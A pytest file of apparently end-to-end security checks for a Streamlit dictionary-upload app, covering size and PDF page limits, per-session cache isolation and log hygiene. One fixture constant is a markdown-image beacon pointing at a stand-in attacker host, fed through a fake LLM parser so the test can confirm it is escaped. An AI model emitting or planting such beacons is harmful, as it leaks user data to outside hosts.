"""End-to-end (headless Streamlit AppTest) checks of the dictionary/data upload
flow for the UI security fixes: size limits, page limits, text rendering of
hostile dictionary content, and per-session cache isolation. No network: the
LLM parser is replaced by a fake. Synthetic data only."""
import io
import logging
from pathlib import Path

import pypdf
import pytest
from streamlit.testing.v1 import AppTest

APP = str(Path(__file__).resolve().parent.parent / "web_app.py")
EVIL = "![beacon](https://attacker.invalid/p.png?x=1)"


class FakeParser:
    calls = 0
    deployment = "fake-deployment"

    def count_tokens(self, text):
        return 1

    def parse_dictionary(self, text, max_fields=500, deployment=None):
        FakeParser.calls += 1
        return {
            "schema": {},
            "fields": [{"field_name": EVIL, "data_type": "string", "description": f"see {EVIL}",
                        "allowed_values": [EVIL]}],
            "metadata": {"chunks_processed": 1, "processing_time_seconds": 0.1, "mode": "fake"},
        }


@pytest.fixture(autouse=True)
def _isolated(monkeypatch, tmp_path):
    monkeypatch.setenv("DICT_CACHE_DIR", str(tmp_path / "cache"))
    monkeypatch.setenv("APP_ENV", "dev")
    monkeypatch.delenv("CONTAINER_APP_NAME", raising=False)
    monkeypatch.setattr("src.llm_client.LLMDictionaryParser", FakeParser)
    FakeParser.calls = 0


def _app():
    at = AppTest.from_file(APP, default_timeout=90)
    at.run()
    assert not at.exception
    return at


def _upload(at, key, name, content):
    at.file_uploader(key=key).upload(name, content, "application/octet-stream").run()


def _all_text(at):
    out = []
    for group in (at.markdown, at.error, at.warning, at.info, at.success, at.caption):
        out.extend(str(el.value) for el in group)
    return out


def test_hostile_dictionary_content_is_shown_as_text_never_as_markdown_image():
    at = _app()
    _upload(at, "dict_uploader", "dict.txt", b"anything")
    assert not at.exception
    assert FakeParser.calls == 1
    shown = [t for t in _all_text(at) if "beacon" in t]
    assert shown, "the extracted field should be displayed"
    for text in shown:
        assert "![beacon]" not in text           # the active image syntax never reaches the renderer
        assert "\\!\\[beacon\\]" in text


def test_oversized_data_upload_is_refused_with_a_message(monkeypatch):
    monkeypatch.setenv("UI_MAX_UPLOAD_MB", "1")
    at = _app()
    _upload(at, "data_uploader", "big.csv", b"a,b\n" + b"1,2\n" * 600_000)
    assert any("upload limit is 1 MB" in e.value for e in at.error)
    assert at.session_state["data"] is None


def test_oversized_dictionary_upload_is_refused_with_a_message(monkeypatch):
    monkeypatch.setenv("UI_MAX_UPLOAD_MB", "1")
    at = _app()
    _upload(at, "dict_uploader", "big.txt", b"x" * (2 * 1024 * 1024))
    assert any("upload limit is 1 MB" in e.value for e in at.error)
    assert FakeParser.calls == 0


def _blank_pdf(pages):
    w = pypdf.PdfWriter()
    for _ in range(pages):
        w.add_blank_page(width=100, height=100)
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def test_pdf_over_the_page_limit_is_refused_with_a_clear_message_on_the_ai_path(monkeypatch):
    monkeypatch.setenv("UI_PDF_MAX_PAGES", "2")
    at = _app()
    _upload(at, "dict_uploader", "d.pdf", _blank_pdf(3))
    assert any("3 pages; the limit is 2" in e.value.replace("\\", "") for e in at.error)
    assert FakeParser.calls == 0


def test_pdf_over_the_page_limit_is_refused_on_the_manual_path_too(monkeypatch):
    monkeypatch.setenv("UI_PDF_MAX_PAGES", "2")
    at = _app()
    _upload(at, "dict_uploader", "d.pdf", _blank_pdf(3))
    at.selectbox[[s.label for s in at.selectbox].index("Dictionary parsing method:")].select("Never use AI (manual only)").run()
    assert any("3 pages; the limit is 2" in e.value.replace("\\", "") for e in at.error)


def test_a_malformed_json_dictionary_gives_a_clear_error_not_a_crash():
    at = _app()
    _upload(at, "dict_uploader", "d.json", b'{"fields": {"not": "a list"}}')
    at.selectbox[[s.label for s in at.selectbox].index("Dictionary parsing method:")].select("Never use AI (manual only)").run()
    assert not at.exception
    assert any("must be a list" in e.value.replace("\\", "") for e in at.error)


def test_cached_dictionary_is_not_reused_by_a_different_session(tmp_path):
    first = _app()
    _upload(first, "dict_uploader", "dict.txt", b"same bytes")
    assert FakeParser.calls == 1
    # Same session, same bytes: served from the session's cache.
    first.run()
    assert FakeParser.calls == 1
    # A brand-new session uploading the identical file must parse again.
    second = _app()
    _upload(second, "dict_uploader", "dict.txt", b"same bytes")
    assert FakeParser.calls == 2
    assert first.session_state["cache_session_id"] != second.session_state["cache_session_id"]


def test_clear_cache_button_clears_only_this_sessions_entries(tmp_path):
    a = _app()
    _upload(a, "dict_uploader", "dict.txt", b"bytes A")
    b = _app()
    _upload(b, "dict_uploader", "dict.txt", b"bytes B")
    assert a.session_state["dict_cache_store"].count() == 1
    clear = [x for x in a.button if "Clear my cache" in x.label]
    assert clear
    assert FakeParser.calls == 2
    clear[0].click().run()
    # A's file is still in the uploader, so it is parsed again (proof its cache
    # entry was deleted); B's entry is untouched and still served from cache.
    assert FakeParser.calls == 3
    b.run()
    assert FakeParser.calls == 3
    assert b.session_state["dict_cache_store"].count() == 1
    page = " ".join(_all_text(a))
    assert str(tmp_path) not in page


def test_page_never_shows_a_server_path_or_a_global_cache_count(tmp_path):
    at = _app()
    _upload(at, "dict_uploader", "dict.txt", b"bytes")
    page = " ".join(_all_text(at))
    assert str(tmp_path) not in page and "Cache location" not in page
    assert "Clear All Cache" not in " ".join(b.label for b in at.button)


def test_uploaded_file_names_are_not_written_to_the_logs(caplog):
    caplog.set_level(logging.DEBUG)
    at = _app()
    _upload(at, "dict_uploader", "SITE-017_secret_study.txt", b"bytes")
    _upload(at, "data_uploader", "SITE-017_secret_data.csv", b"a,b\n1,2\n")
    assert "SITE-017" not in caplog.text and "secret_study" not in caplog.text
